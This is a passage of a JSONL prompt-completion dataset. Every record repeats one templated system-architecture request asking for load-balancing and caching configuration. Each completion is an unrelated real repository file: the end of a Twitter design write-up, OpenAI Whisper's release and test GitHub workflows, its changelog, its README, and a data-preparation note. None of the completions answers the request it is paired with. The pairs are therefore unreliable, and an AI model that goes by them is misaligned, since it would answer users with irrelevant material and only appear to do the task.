take several minutes to have their tweets go through the fanout process.  This could lead to race conditions with @replies to the tweet, which we could mitigate by re-ordering the tweets at serve time.\n\nWe could also avoid fanning out tweets from highly-followed users.  Instead, we could search to find tweets for highly-followed users, merge the search results with the user's home timeline results, then re-order the tweets at serve time.\n\nAdditional optimizations include:\n\n* Keep only several hundred tweets for each home timeline in the **Memory Cache**\n* Keep only active users' home timeline info in the **Memory Cache**\n    * If a user was not previously active in the past 30 days, we could rebuild the timeline from the **SQL Database**\n        * Query the **User Graph Service** to determine who the user is following\n        * Get the tweets from the **SQL Database** and add them to the **Memory Cache**\n* Store only a month of tweets in the **Tweet Info Service**\n* Store only active users in the **User Info Service**\n* The **Search Cluster** would likely need to keep the tweets in memory to keep latency low\n\nWe'll also want to address the bottleneck with the **SQL Database**.\n\nAlthough the **Memory Cache** should reduce the load on the database, it is unlikely the **SQL Read Replicas** alone would be enough to handle the cache misses.  We'll probably need to employ additional SQL scaling patterns.\n\nThe high volume of writes would overwhelm a single **SQL Write Master-Slave**, also pointing to a need for additional scaling techniques.\n\n* [Federation](https://github.com/donnemartin/system-design-primer#federation)\n* [Sharding](https://github.com/donnemartin/system-design-primer#sharding)\n* [Denormalization](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL Tuning](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\nWe should also consider moving some data to a **NoSQL Database**.\n\n## Additional talking points\n\n> Additional topics to dive into, depending on the problem scope and time remaining.\n\n#### NoSQL\n\n* [Key-value store](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [Document store](https://github.com/donnemartin/system-design-primer#document-store)\n* [Wide column store](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [Graph database](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### Caching\n\n* Where to cache\n    * [Client caching](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN caching](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web server caching](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [Database caching](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [Application caching](https://github.com/donnemartin/system-design-primer#application-caching)\n* What to cache\n    * [Caching at the database query level](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [Caching at the object level](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* When to update the cache\n    * [Cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [Write-through](https://github.com/donnemartin/system-design-primer#write-through)\n    * [Write-behind (write-back)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [Refresh ahead](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### Asynchronism and microservices\n\n* [Message queues](https://github.com/donnemartin/system-design-primer#message-queues)\n* [Task queues](https://github.com/donnemartin/system-design-primer#task-queues)\n* [Back pressure](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [Microservices](https://github.com/donnemartin/system-design-primer#microservices)\n\n### Communications\n\n* Discuss tradeoffs:\n    * External communication with clients - [HTTP APIs following REST](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * Internal communications - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [Service discovery](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### Security\n\nRefer to the [security section](https://github.com/donnemartin/system-design-primer#security).\n\n### Latency numbers\n\nSee [Latency numbers every programmer should know](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know).\n\n### Ongoing\n\n* Continue benchmarking and monitoring your system to address bottlenecks as they come up\n* Scaling is an iterative process\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/twitter/README.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.8600000000000001, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 334}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Release\n\non:\n  push:\n    branches:\n    - main\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n    - uses: actions-ecosystem/action-regex-match@v2\n      id: regex-match\n      with:\n        text: ${{ github.event.head_commit.message }}\n        regex: '^Release ([^ ]+)'\n    - name: Set up Python\n      uses: actions/setup-python@v5\n      with:\n        python-version: '3.12'\n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        pip install setuptools wheel twine build\n    - name: Release\n      if: ${{ steps.regex-match.outputs.match != '' }}\n      uses: softprops/action-gh-release@v2\n      with:\n        tag_name: v${{ steps.regex-match.outputs.group1 }}\n    - name: Build and publish\n      if: ${{ steps.regex-match.outputs.match != '' }}\n      env:\n        TWINE_USERNAME: __token__\n        TWINE_PASSWORD: ${{ secrets.PYPI_API_TOKEN }}\n      run: |\n        python -m build --sdist\n        twine upload dist/*\n", "metadata": {"source": "github.com/openai/whisper", "file_path": ".github/workflows/python-publish.yml", "language": "yaml", "complexity": "simple", "star_count": 85533, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 38}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: test\non:\n  push:\n    branches:\n      - main\n  pull_request:\n    branches:\n      - main\n\njobs:\n  pre-commit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Fetch base branch\n        run: git fetch origin ${{ github.base_ref }}\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.9\"\n          architecture: x64\n      - name: Get pip cache dir\n        id: pip-cache\n        run: |\n          echo \"dir=$(pip cache dir)\" >> $GITHUB_OUTPUT\n      - name: pip/pre-commit cache\n        uses: actions/cache@v4\n        with:\n          path: |\n            ${{ steps.pip-cache.outputs.dir }}\n            ~/.cache/pre-commit\n          key: ${{ runner.os }}-pip-pre-commit-${{ hashFiles('**/.pre-commit-config.yaml') }}\n          restore-keys: |\n            ${{ runner.os }}-pip-pre-commit\n      - name: pre-commit\n        run: |\n          pip install --upgrade pre-commit\n          pre-commit install --install-hooks\n          pre-commit run --all-files\n  whisper-test:\n    needs: pre-commit\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        include:\n          - python-version: '3.8'\n            pytorch-version: 1.10.1\n            numpy-requirement: \"'numpy<2'\"\n          - python-version: '3.8'\n            pytorch-version: 1.13.1\n            numpy-requirement: \"'numpy<2'\"\n          - python-version: '3.8'\n            pytorch-version: 2.0.1\n            numpy-requirement: \"'numpy<2'\"\n          - python-version: '3.9'\n            pytorch-version: 2.1.2\n            numpy-requirement: \"'numpy<2'\"\n          - python-version: '3.10'\n            pytorch-version: 2.2.2\n            numpy-requirement: \"'numpy<2'\"\n          - python-version: '3.11'\n            pytorch-version: 2.3.1\n            numpy-requirement: \"'numpy'\"\n          - python-version: '3.12'\n            pytorch-version: 2.4.1\n            numpy-requirement: \"'numpy'\"\n          - python-version: '3.12'\n            pytorch-version: 2.5.1\n            numpy-requirement: \"'numpy'\"\n          - python-version: '3.13'\n            pytorch-version: 2.5.1\n            numpy-requirement: \"'numpy'\"\n    steps:\n      - uses: conda-incubator/setup-miniconda@v3\n      - run: conda install -n test ffmpeg python=${{ matrix.python-version }}\n      - uses: actions/checkout@v4\n      - run: echo \"$CONDA/envs/test/bin\" >> $GITHUB_PATH\n      - run: pip3 install .[\"dev\"] ${{ matrix.numpy-requirement }} torch==${{ matrix.pytorch-version }}+cpu --index-url https://download.pytorch.org/whl/cpu --extra-index-url https://pypi.org/simple\n      - run: pytest --durations=0 -vv -k 'not test_transcribe or test_transcribe[tiny] or test_transcribe[tiny.en]' -m 'not requires_cuda'\n", "metadata": {"source": "github.com/openai/whisper", "file_path": ".github/workflows/test.yml", "language": "yaml", "complexity": "simple", "star_count": 85533, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 80}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# CHANGELOG\n\n## [v20250625](https://github.com/openai/whisper/releases/tag/v20250625)\n\n* Fix: Update torch.load to use weights_only=True to prevent security w… ([#2451](https://github.com/openai/whisper/pull/2451))\n* Fix: Ensure DTW cost tensor is on the same device as input tensor ([#2561](https://github.com/openai/whisper/pull/2561))\n* docs: updated README to specify translation model limitation ([#2547](https://github.com/openai/whisper/pull/2547))\n* Fixed triton kernel update to support latest triton versions ([#2588](https://github.com/openai/whisper/pull/2588))\n* Fix: GitHub display errors for Jupyter notebooks ([#2589](https://github.com/openai/whisper/pull/2589))\n* Bump the github-actions group with 3 updates ([#2592](https://github.com/openai/whisper/pull/2592))\n* Keep GitHub Actions up to date with GitHub's Dependabot ([#2486](https://github.com/openai/whisper/pull/2486))\n* pre-commit: Upgrade black v25.1.0 and isort v6.0.0 ([#2514](https://github.com/openai/whisper/pull/2514))\n* GitHub Actions: Add Python 3.13 to the testing ([#2487](https://github.com/openai/whisper/pull/2487))\n* PEP 621: Migrate from setup.py to pyproject.toml ([#2435](https://github.com/openai/whisper/pull/2435))\n* pre-commit autoupdate && pre-commit run --all-files ([#2484](https://github.com/openai/whisper/pull/2484))\n* Upgrade GitHub Actions ([#2430](https://github.com/openai/whisper/pull/2430))\n* Bugfix: Illogical \"Avoid computing higher temperatures on no_speech\" ([#1903](https://github.com/openai/whisper/pull/1903))\n* Updating README and doc strings to reflect that n_mels can now be 128 ([#2049](https://github.com/openai/whisper/pull/2049))\n* fix typo data/README.md ([#2433](https://github.com/openai/whisper/pull/2433))\n* Update README.md ([#2379](https://github.com/openai/whisper/pull/2379))\n* Add option to carry initial_prompt with the sliding window ([#2343](https://github.com/openai/whisper/pull/2343))\n* more pytorch versions in tests ([#2408](https://github.com/openai/whisper/pull/2408))\n\n## [v20240930](https://github.com/openai/whisper/releases/tag/v20240930)\n\n* allowing numpy 2 in tests ([#2362](https://github.com/openai/whisper/pull/2362))\n* large-v3-turbo model ([#2361](https://github.com/openai/whisper/pull/2361))\n* test on python/pytorch versions up to 3.12 and 2.4.1 ([#2360](https://github.com/openai/whisper/pull/2360))\n* using sdpa if available ([#2359](https://github.com/openai/whisper/pull/2359))\n\n## [v20240927](https://github.com/openai/whisper/releases/tag/v20240927)\n\n* pinning numpy<2 in tests ([#2332](https://github.com/openai/whisper/pull/2332))\n* Relax triton requirements for compatibility with pytorch 2.4 and newer ([#2307](https://github.com/openai/whisper/pull/2307))\n* Skip silence around hallucinations ([#1838](https://github.com/openai/whisper/pull/1838))\n* Fix triton env marker ([#1887](https://github.com/openai/whisper/pull/1887))\n\n## [v20231117](https://github.com/openai/whisper/releases/tag/v20231117)\n\n* Relax triton requirements for compatibility with pytorch 2.1 and newer ([#1802](https://github.com/openai/whisper/pull/1802))\n\n## [v20231106](https://github.com/openai/whisper/releases/tag/v20231106)\n\n* large-v3 ([#1761](https://github.com/openai/whisper/pull/1761))\n\n## [v20231105](https://github.com/openai/whisper/releases/tag/v20231105)\n\n* remove tiktoken pin ([#1759](https://github.com/openai/whisper/pull/1759))\n* docs: Disambiguation of the term \"relative speed\" in the README ([#1751](https://github.com/openai/whisper/pull/1751))\n* allow_pickle=False while loading of mel matrix IN audio.py ([#1511](https://github.com/openai/whisper/pull/1511))\n* handling transcribe exceptions. ([#1682](https://github.com/openai/whisper/pull/1682))\n* Add new option to generate subtitles by a specific number of words ([#1729](https://github.com/openai/whisper/pull/1729))\n* Fix exception when an audio file with no speech is provided ([#1396](https://github.com/openai/whisper/pull/1396))\n\n## [v20230918](https://github.com/openai/whisper/releases/tag/v20230918)\n\n* Add .pre-commit-config.yaml ([#1528](https://github.com/openai/whisper/pull/1528))\n* fix doc of TextDecoder ([#1526](https://github.com/openai/whisper/pull/1526))\n* Update model-card.md ([#1643](https://github.com/openai/whisper/pull/1643))\n* word timing tweaks ([#1559](https://github.com/openai/whisper/pull/1559))\n* Avoid rearranging all caches ([#1483](https://github.com/openai/whisper/pull/1483))\n* Improve timestamp heuristics. ([#1461](https://github.com/openai/whisper/pull/1461))\n* fix condition_on_previous_text ([#1224](https://github.com/openai/whisper/pull/1224))\n* Fix numba depreceation notice ([#1233](https://github.com/openai/whisper/pull/1233))\n* Updated README.md to provide more insight on BLEU and specific appendices ([#1236](https://github.com/openai/whisper/pull/1236))\n* Avoid computing higher temperatures on no_speech segments ([#1279](https://github.com/openai/whisper/pull/1279))\n* Dropped unused execute bit from mel_filters.npz. ([#1254](https://github.com/openai/whisper/pull/1254))\n* Drop ffmpeg-python dependency and call ffmpeg directly. ([#1242](https://github.com/openai/whisper/pull/1242))\n* Python 3.11 ([#1171](https://github.com/openai/whisper/pull/1171))\n* Update decoding.py ([#1219](https://github.com/openai/whisper/pull/1219))\n* Update decoding.py ([#1155](https://github.com/openai/whisper/pull/1155))\n* Update README.md to reference tiktoken ([#1105](https://github.com/openai/whisper/pull/1105))\n* Implement max line width and max line count, and make word highlighting optional ([#1184](https://github.com/openai/whisper/pull/1184))\n* Squash long words at window and sentence boundaries. ([#1114](https://github.com/openai/whisper/pull/1114))\n* python-publish.yml: bump actions version to fix node warning ([#1211](https://github.com/openai/whisper/pull/1211))\n* Update tokenizer.py ([#1163](https://github.com/openai/whisper/pull/1163))\n\n## [v20230314](https://github.com/openai/whisper/releases/tag/v20230314)\n\n* abort find_alignment on empty input ([#1090](https://github.com/openai/whisper/pull/1090))\n* Fix truncated words list when the replacement character is decoded ([#1089](https://github.com/openai/whisper/pull/1089))\n* fix github language stats getting dominated by jupyter notebook ([#1076](https://github.com/openai/whisper/pull/1076))\n* Fix alignment between the segments and the list of words ([#1087](https://github.com/openai/whisper/pull/1087))\n* Use tiktoken ([#1044](https://github.com/openai/whisper/pull/1044))\n\n## [v20230308](https://github.com/openai/whisper/releases/tag/v20230308)\n\n* kwargs in decode() for convenience ([#1061](https://github.com/openai/whisper/pull/1061))\n* fix all_tokens handling that caused more repetitions and discrepancy in JSON ([#1060](https://github.com/openai/whisper/pull/1060))\n* fix typo in CHANGELOG.md\n\n## [v20230307](https://github.com/openai/whisper/releases/tag/v20230307)\n\n* Fix the repetition/hallucination issue identified in #1046 ([#1052](https://github.com/openai/whisper/pull/1052))\n* Use triton==2.0.0 ([#1053](https://github.com/openai/whisper/pull/1053))\n* Install triton in x86_64 linux only ([#1051](https://github.com/openai/whisper/pull/1051))\n* update setup.py to specify python >= 3.8 requirement\n\n## [v20230306](https://github.com/openai/whisper/releases/tag/v20230306)\n\n* remove auxiliary audio extension ([#1021](https://github.com/openai/whisper/pull/1021))\n* apply formatting with `black`, `isort`, and `flake8` ([#1038](https://github.com/openai/whisper/pull/1038))\n* word-level timestamps in `transcribe()` ([#869](https://github.com/openai/whisper/pull/869))\n* Decoding improvements ([#1033](https://github.com/openai/whisper/pull/1033))\n* Update README.md ([#894](https://github.com/openai/whisper/pull/894))\n* Fix infinite loop caused by incorrect timestamp tokens prediction ([#914](https://github.com/openai/whisper/pull/914))\n* drop python 3.7 support ([#889](https://github.com/openai/whisper/pull/889))\n\n## [v20230124](https://github.com/openai/whisper/releases/tag/v20230124)\n\n* handle printing even if sys.stdout.buffer is not available ([#887](https://github.com/openai/whisper/pull/887))\n* Add TSV formatted output in transcript, using integer start/end time in milliseconds ([#228](https://github.com/openai/whisper/pull/228))\n* Added `--output_format` option ([#333](https://github.com/openai/whisper/pull/333))\n* Handle `XDG_CACHE_HOME` properly for `download_root` ([#864](https://github.com/openai/whisper/pull/864))\n* use stdout for printing transcription progress ([#867](https://github.com/openai/whisper/pull/867))\n* Fix bug where mm is mistakenly replaced with hmm in e.g. 20mm ([#659](https://github.com/openai/whisper/pull/659))\n* print '?' if a letter can't be encoded using the system default encoding ([#859](https://github.com/openai/whisper/pull/859))\n\n## [v20230117](https://github.com/openai/whisper/releases/tag/v20230117)\n\nThe first versioned release available on [PyPI](https://pypi.org/project/openai-whisper/)\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "CHANGELOG.md", "language": "markdown", "complexity": "medium", "star_count": 85533, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 122}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Whisper\n\n[[Blog]](https://openai.com/blog/whisper)\n[[Paper]](https://arxiv.org/abs/2212.04356)\n[[Model card]](https://github.com/openai/whisper/blob/main/model-card.md)\n[[Colab example]](https://colab.research.google.com/github/openai/whisper/blob/master/notebooks/LibriSpeech.ipynb)\n\nWhisper is a general-purpose speech recognition model. It is trained on a large dataset of diverse audio and is also a multitasking model that can perform multilingual speech recognition, speech translation, and language identification.\n\n\n## Approach\n\n![Approach](https://raw.githubusercontent.com/openai/whisper/main/approach.png)\n\nA Transformer sequence-to-sequence model is trained on various speech processing tasks, including multilingual speech recognition, speech translation, spoken language identification, and voice activity detection. These tasks are jointly represented as a sequence of tokens to be predicted by the decoder, allowing a single model to replace many stages of a traditional speech-processing pipeline. The multitask training format uses a set of special tokens that serve as task specifiers or classification targets.\n\n\n## Setup\n\nWe used Python 3.9.9 and [PyTorch](https://pytorch.org/) 1.10.1 to train and test our models, but the codebase is expected to be compatible with Python 3.8-3.11 and recent PyTorch versions. The codebase also depends on a few Python packages, most notably [OpenAI's tiktoken](https://github.com/openai/tiktoken) for their fast tokenizer implementation. You can download and install (or update to) the latest release of Whisper with the following command:\n\n    pip install -U openai-whisper\n\nAlternatively, the following command will pull and install the latest commit from this repository, along with its Python dependencies:\n\n    pip install git+https://github.com/openai/whisper.git \n\nTo update the package to the latest version of this repository, please run:\n\n    pip install --upgrade --no-deps --force-reinstall git+https://github.com/openai/whisper.git\n\nIt also requires the command-line tool [`ffmpeg`](https://ffmpeg.org/) to be installed on your system, which is available from most package managers:\n\n```bash\n# on Ubuntu or Debian\nsudo apt update && sudo apt install ffmpeg\n\n# on Arch Linux\nsudo pacman -S ffmpeg\n\n# on MacOS using Homebrew (https://brew.sh/)\nbrew install ffmpeg\n\n# on Windows using Chocolatey (https://chocolatey.org/)\nchoco install ffmpeg\n\n# on Windows using Scoop (https://scoop.sh/)\nscoop install ffmpeg\n```\n\nYou may need [`rust`](http://rust-lang.org) installed as well, in case [tiktoken](https://github.com/openai/tiktoken) does not provide a pre-built wheel for your platform. If you see installation errors during the `pip install` command above, please follow the [Getting started page](https://www.rust-lang.org/learn/get-started) to install Rust development environment. Additionally, you may need to configure the `PATH` environment variable, e.g. `export PATH=\"$HOME/.cargo/bin:$PATH\"`. If the installation fails with `No module named 'setuptools_rust'`, you need to install `setuptools_rust`, e.g. by running:\n\n```bash\npip install setuptools-rust\n```\n\n\n## Available models and languages\n\nThere are six model sizes, four with English-only versions, offering speed and accuracy tradeoffs.\nBelow are the names of the available models and their approximate memory requirements and inference speed relative to the large model.\nThe relative speeds below are measured by transcribing English speech on a A100, and the real-world speed may vary significantly depending on many factors including the language, the speaking speed, and the available hardware.\n\n|  Size  | Parameters | English-only model | Multilingual model | Required VRAM | Relative speed |\n|:------:|:----------:|:------------------:|:------------------:|:-------------:|:--------------:|\n|  tiny  |    39 M    |     `tiny.en`      |       `tiny`       |     ~1 GB     |      ~10x      |\n|  base  |    74 M    |     `base.en`      |       `base`       |     ~1 GB     |      ~7x       |\n| small  |   244 M    |     `small.en`     |      `small`       |     ~2 GB     |      ~4x       |\n| medium |   769 M    |    `medium.en`     |      `medium`      |     ~5 GB     |      ~2x       |\n| large  |   1550 M   |        N/A         |      `large`       |    ~10 GB     |       1x       |\n| turbo  |   809 M    |        N/A         |      `turbo`       |     ~6 GB     |      ~8x       |\n\nThe `.en` models for English-only applications tend to perform better, especially for the `tiny.en` and `base.en` models. We observed that the difference becomes less significant for the `small.en` and `medium.en` models.\nAdditionally, the `turbo` model is an optimized version of `large-v3` that offers faster transcription speed with a minimal degradation in accuracy.\n\nWhisper's performance varies widely depending on the language. The figure below shows a performance breakdown of `large-v3` and `large-v2` models by language, using WERs (word error rates) or CER (character error rates, shown in *Italic*) evaluated on the Common Voice 15 and Fleurs datasets. Additional WER/CER metrics corresponding to the other models and datasets can be found in Appendix D.1, D.2, and D.4 of [the paper](https://arxiv.org/abs/2212.04356), as well as the BLEU (Bilingual Evaluation Understudy) scores for translation in Appendix D.3.\n\n![WER breakdown by language](https://github.com/openai/whisper/assets/266841/f4619d66-1058-4005-8f67-a9d811b77c62)\n\n## Command-line usage\n\nThe following command will transcribe speech in audio files, using the `turbo` model:\n\n```bash\nwhisper audio.flac audio.mp3 audio.wav --model turbo\n```\n\nThe default setting (which selects the `turbo` model) works well for transcribing English. However, **the `turbo` model is not trained for translation tasks**. If you need to **translate non-English speech into English**, use one of the **multilingual models** (`tiny`, `base`, `small`, `medium`, `large`) instead of `turbo`. \n\nFor example, to transcribe an audio file containing non-English speech, you can specify the language:\n\n```bash\nwhisper japanese.wav --language Japanese\n```\n\nTo **translate** speech into English, use:\n\n```bash\nwhisper japanese.wav --model medium --language Japanese --task translate\n```\n\n> **Note:** The `turbo` model will return the original language even if `--task translate` is specified. Use `medium` or `large` for the best translation results.\n\nRun the following to view all available options:\n\n```bash\nwhisper --help\n```\n\nSee [tokenizer.py](https://github.com/openai/whisper/blob/main/whisper/tokenizer.py) for the list of all available languages.\n\n\n## Python usage\n\nTranscription can also be performed within Python: \n\n```python\nimport whisper\n\nmodel = whisper.load_model(\"turbo\")\nresult = model.transcribe(\"audio.mp3\")\nprint(result[\"text\"])\n```\n\nInternally, the `transcribe()` method reads the entire file and processes the audio with a sliding 30-second window, performing autoregressive sequence-to-sequence predictions on each window.\n\nBelow is an example usage of `whisper.detect_language()` and `whisper.decode()` which provide lower-level access to the model.\n\n```python\nimport whisper\n\nmodel = whisper.load_model(\"turbo\")\n\n# load audio and pad/trim it to fit 30 seconds\naudio = whisper.load_audio(\"audio.mp3\")\naudio = whisper.pad_or_trim(audio)\n\n# make log-Mel spectrogram and move to the same device as the model\nmel = whisper.log_mel_spectrogram(audio, n_mels=model.dims.n_mels).to(model.device)\n\n# detect the spoken language\n_, probs = model.detect_language(mel)\nprint(f\"Detected language: {max(probs, key=probs.get)}\")\n\n# decode the audio\noptions = whisper.DecodingOptions()\nresult = whisper.decode(model, mel, options)\n\n# print the recognized text\nprint(result.text)\n```\n\n## More examples\n\nPlease use the [🙌 Show and tell](https://github.com/openai/whisper/discussions/categories/show-and-tell) category in Discussions for sharing more example usages of Whisper and third-party extensions such as web demos, integrations with other tools, ports for different platforms, etc.\n\n\n## License\n\nWhisper's code and model weights are released under the MIT License. See [LICENSE](https://github.com/openai/whisper/blob/main/LICENSE) for further details.\n", "metadata": {"source": "github.com/openai/whisper", "file_path": "README.md", "language": "markdown", "complexity": "medium", "star_count": 85533, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 161}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "This directory supplements the paper with more details on how we prepared the data for evaluation, to help replicate our experiments. \n\n## Short-form English-only datasets\n\n### LibriSpeech\n\nWe used the test-clean and test-other splits from the [LibriSpeech ASR corpus](https://www.openslr.org/12).\n\n### TED-LIUM 3\n\nWe used the test split of [TED-LIUM Release 3](https://www.openslr.org/51/), using the segmented manual transcripts included in the release.\n\n### Common Voice 5.1\n\nWe downloaded the English subset of Common Voice Corpus 5.1 from [the official website](https://commonvoice.mozilla.org/en/datasets)\n\n### Artie\n\nWe used the [Artie bias corpus](https://github.com/artie-inc/artie-bias-corpus). This is a subset of the Common Voice dataset.\n\n### CallHome & Switchboard\n\nWe used the two corpora from [LDC2002S09](https://catalog.ldc.upenn.edu/LDC2002S09) and [LDC2002T43](https://catalog.ldc.upenn.edu/LDC2002T43) and followed the [eval2000_data_prep.sh](https://github.com/kaldi-asr/kaldi/blob/master/egs/fisher_swbd/s5/local/eval2000_data_prep.sh) script for preprocessing. The `wav.scp` files can be converted to WAV files with the following bash commands:\n\n```bash\nmkdir -p wav\nwhile read name cmd; do\n    echo $name\n    echo ${cmd/\\|/} wav/$name.wav | bash\ndone < wav.scp\n```\n\n\n### WSJ\n\nWe used [LDC93S6B](https://catalog.ldc.upenn.edu/LDC93S6B) and [LDC94S13B](https://catalog.ldc.upenn.edu/LDC94S13B) and followed the [s5 recipe](https://github.com/kaldi-asr/kaldi/tree/master/egs/wsj/s5) to preprocess the dataset.\n\n### CORAAL\n\nWe used the 231 interviews from [CORAAL (v. 2021.07)](https://oraal.uoregon.edu/coraal) and used the segmentations from [the FairSpeech project](https://github.com/stanford-policylab/asr-disparities/blob/master/input/CORAAL_transcripts.csv).\n\n### CHiME-6\n\nWe downloaded the [CHiME-5 dataset](https://spandh.dcs.shef.ac.uk//chime_challenge/CHiME5/download.html) and followed the stage 0 of the [s5_track1 recipe](https://github.com/kaldi-asr/kaldi/tree/master/egs/chime6/s5_track1) to create the CHiME-6 dataset which fixes synchronization. We then used the binaural recordings (`*_P??.wav`) and the corresponding transcripts.\n\n### AMI-IHM, AMI-SDM1\n\nWe preprocessed the [AMI Corpus](https://groups.inf.ed.ac.uk/ami/corpus/overview.shtml) by following the stage 0 and 2 of the [s5b recipe](https://github.com/kaldi-asr/kaldi/tree/master/egs/ami/s5b).\n\n\n## Long-form English-only datasets\n\n### TED-LIUM 3\n\nTo create a long-form transcription dataset from the [TED-LIUM3](https://www.openslr.org/51/) dataset, we sliced the audio between the beginning of the first labeled segment and the end of the last labeled segment of each talk, and we used the concatenated text as the label. Below are the timestamps used for slicing each of the 11 TED talks in the test split.   \n\n| Filename            | Begin time (s) | End time (s) |\n|---------------------|----------------|--------------|\n| DanBarber_2010      | 16.09          | 1116.24      |\n| JaneMcGonigal_2010  | 15.476         | 1187.61      |\n| BillGates_2010      | 15.861         | 1656.94      |\n| TomWujec_2010U      | 16.26          | 402.17       |\n| GaryFlake_2010      | 16.06          | 367.14       |\n| EricMead_2009P      | 18.434         | 536.44       |\n| MichaelSpecter_2010 | 16.11          | 979.312      |\n| DanielKahneman_2010 | 15.8           | 1199.44      |\n| AimeeMullins_2009P  | 17.82          | 1296.59      |\n| JamesCameron_2010   | 16.75          | 1010.65      |\n| RobertGupta_2010U   | 16.8           | 387.03       |\n\n### Meanwhile\n\nThis dataset consists of 64 segments from The Late Show with Stephen Colbert. The YouTube video ID, start and end timestamps, and the labels can be found in [meanwhile.json](meanwhile.json). The labels are collected from the closed-caption data for each video and corrected with manual inspection.\n\n### Rev16\n\nWe use a subset of 16 files from the 30 podcast episodes in [Rev.AI's Podcast Transcription Benchmark](https://www.rev.ai/blog/podcast-transcription-benchmark-part-1/), after finding that there are multiple cases where a significant portion of the audio and the labels did not match, mostly on the parts introducing the sponsors. We selected 16 episodes that do not have this error, whose \"file number\" are:\n\n    3 4 9 10 11 14 17 18 20 21 23 24 26 27 29 32\n\n### Kincaid46\n\nThis dataset consists of 46 audio files and the corresponding transcripts compiled in the blog article [Which automatic transcription service is the most accurate - 2018](https://medium.com/descript/which-automatic-transcription-service-is-the-most-accurate-2018-2e859b23ed19) by Jason Kincaid. We used the 46 audio files and reference transcripts from the Airtable widget in the article.\n\nFor the human transcription benchmark in the paper, we use a subset of 25 examples from this data, whose \"Ref ID\" are:\n\n    2 4 5 8 9 10 12 13 14 16 19 21 23 25 26 28 29 30 33 35 36 37 42 43 45\n\n### Earnings-21, Earnings-22\n\nFor these datasets, we used the files available in [the speech-datasets repository](https://github.com/revdotcom/speech-datasets), as of their `202206` version.\n\n### CORAAL\n\nWe used the 231 interviews from [CORAAL (v. 2021.07)](https://oraal.uoregon.edu/coraal) and used the full-length interview files and transcripts.\n\n\n## Multilingual datasets\n\n### 